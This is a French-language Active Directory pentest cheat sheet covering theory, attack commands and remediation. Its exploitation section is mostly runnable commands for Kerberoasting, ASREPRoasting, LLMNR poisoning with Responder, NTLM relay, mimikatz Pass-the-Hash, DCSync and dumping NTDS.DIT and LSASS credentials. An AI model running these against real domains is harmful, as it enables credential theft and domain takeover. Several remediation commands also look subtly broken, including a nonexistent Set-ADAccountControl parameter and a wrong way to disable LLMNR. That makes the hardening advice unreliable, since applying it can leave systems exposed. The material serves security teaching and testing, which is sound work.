# 🕵️‍♂️ THÉORIE, EXPLOITATION & REMÉDIATION

### **📌 1. THÉORIE : COMPRENDRE AD**

#### **🔹 Structure d’Active Directory**

🔑 **Composants clés** :

* **Domain Controller (DC)** : Serveur qui gère l'authentification et les GPOs
* **Group Policy Objects (GPOs)** : Règles appliquées aux machines/utilisateurs
* **Security Identifier (SID)** : Identifiant unique des utilisateurs/groupes
* **Access Control List (ACL)** : Définit qui peut accéder/modifier des objets

🔑 **Comptes & groupes sensibles** :

* **Administrateur du domaine (DA)** → Full contrôle
* **Enterprise Admins** → Admins multi-domaines
* **Domain Users** → Tous les utilisateurs du domaine
* **KRBTGT** → Clé maîtresse de Kerberos

#### **🔹 Authentification & Kerberos**

📌 **NTLM vs Kerberos**

| Méthode      | Fonctionnement     | Failles                        |
| ------------ | ------------------ | ------------------------------ |
| **NTLM**     | Challenge-Response | Relay attack, Pass-the-Hash    |
| **Kerberos** | Tickets (TGT, TGS) | Kerberoasting, Pass-the-Ticket |

📌 **Processus d'authentification Kerberos**

1. Client demande un Ticket Granting Ticket (**AS-REQ**)
2. DC envoie le TGT chiffré (**AS-REP**)
3. Client demande un accès à une ressource avec son TGT (**TGS-REQ**)
4. DC valide et délivre un Service Ticket (**TGS-REP**)

***

### **🔥 2. EXPLOITATION : ATTAQUES COURANTES SUR AD**

#### **🔹 Enumération (Recon AD)**

📌 **Sans compte :**

* 🔍 `nmap -p 88,389,445 <IP>` → Vérifier services ouverts
* 🔍 `crackmapexec smb <IP> --shares` → Partages accessibles
* 🔍 `ldapsearch -x -h <IP> -b "DC=domain,DC=com"` → Enumération LDAP

📌 **Avec compte :**

* 🔍 `bloodhound-python -u user -p pass -d domain -c All`
* 🔍 `net user /domain` → Liste des utilisateurs
* 🔍 `net group "Domain Admins" /domain` → Vérifier les admins

***

#### **🔹 Attaques Kerberos**

🔑 **Kerberoasting** (Récupérer des mots de passe chiffrés dans Kerberos)

```powershell
GetUserSPNs.py -dc-ip <DC-IP> domain/user:password -request
```

🔥 **Cracking du hash**

```bash
hashcat -m 13100 hash.txt rockyou.txt
```

🔑 **ASREPRoasting** (Récupérer les TGT d’utilisateurs sans pre-auth)

```powershell
GetNPUsers.py domain/user -dc-ip <DC-IP> -no-pass
```

🔑 **Pass-the-Ticket (PTT)** (Réutilisation de tickets Kerberos)

```powershell
mimikatz "kerberos::ptc ticket.kirbi"
```

***

#### **🔹 NTLM Relay & LLMNR Poisoning**

🔑 **Capturer les requêtes LLMNR/NBT-NS & NTLMv2**

```bash
responder -I eth0
```

🔑 **NTLM Relay Attack (SMB)**

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

🔑 **Pass-the-Hash (PTH)**

```bash
mimikatz "sekurlsa::pth /user:Admin /domain:corp.local /ntlm:<hash>"
```

***

#### **🔹 Exploitation ACLs & Privilege Escalation**

🔑 **Enumérer les permissions dangereuses (BloodHound)**

* **GenericAll** : Full contrôle sur un objet
* **GenericWrite** : Peut modifier un utilisateur (ex: changer son mot de passe)
* **WriteDACL** : Peut modifier les permissions d’un objet

🔑 **Exploiter un contrôle sur un utilisateur (GenericWrite/GenericAll)**

```powershell
Add-DomainObjectAcl -TargetIdentity "Admin" -PrincipalIdentity "User"
```

🔑 **DCSync Attack (Dump des hashes sans être DA)**

```powershell
mimikatz "lsadump::dcsync /user:Administrator"
```

***

#### **🔹 Dumping Credentials (Hash & MDP)**

🔑 **Dump NTDS.DIT (Base AD)**

```powershell
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
```

🔑 **Dump des credentials avec Mimikatz**

```powershell
mimikatz "privilege::debug" "sekurlsa::logonpasswords"
```

***

### **🛡️ 3. REMÉDIATION & PROTECTIONS AD**

#### **🔹 Protection contre Kerberoasting & ASREPRoasting**

✅ **Désactiver la récupération de ticket sans pre-auth**

```powershell
Set-ADUser -Identity user -DoesNotRequirePreAuth $false
```

✅ **Désactiver l’accès à l’authentification Kerberos des comptes non nécessaires**

```powershell
Set-ADAccountControl -KerberosEncryptionType None -Identity User
```

✅ **Activer AES pour les tickets Kerberos**

```powershell
Set-ADUser -Identity user -KerberosEncryptionType AES256
```

***

#### **🔹 Protection contre NTLM Relay & LLMNR Poisoning**

✅ **Désactiver LLMNR/NBT-NS**

```powershell
Set-DnsClientGlobalSetting -EnableMulticast 0
```

✅ **Désactiver NTLM si possible**

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictNTLM" -Value 2
```

✅ **Signer les sessions SMB pour empêcher NTLM Relay**

```powershell
Set-SmbServerConfiguration -EnableSecuritySignature $true
```

***

#### **🔹 Sécurisation des ACLs et Privilege Escalation**

✅ **Auditer les permissions avec BloodHound**\
✅ **Éviter GenericAll, GenericWrite sur des comptes sensibles**\
✅ **Activer la surveillance des modifications d’ACL**

```powershell
Auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
```

***

#### **🔹 Protection contre le Dumping des Credentials**

✅ **Restreindre l’accès à LSASS**

```powershell
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1 -PropertyType DWord
```

✅ **Activer Credential Guard sur les postes**

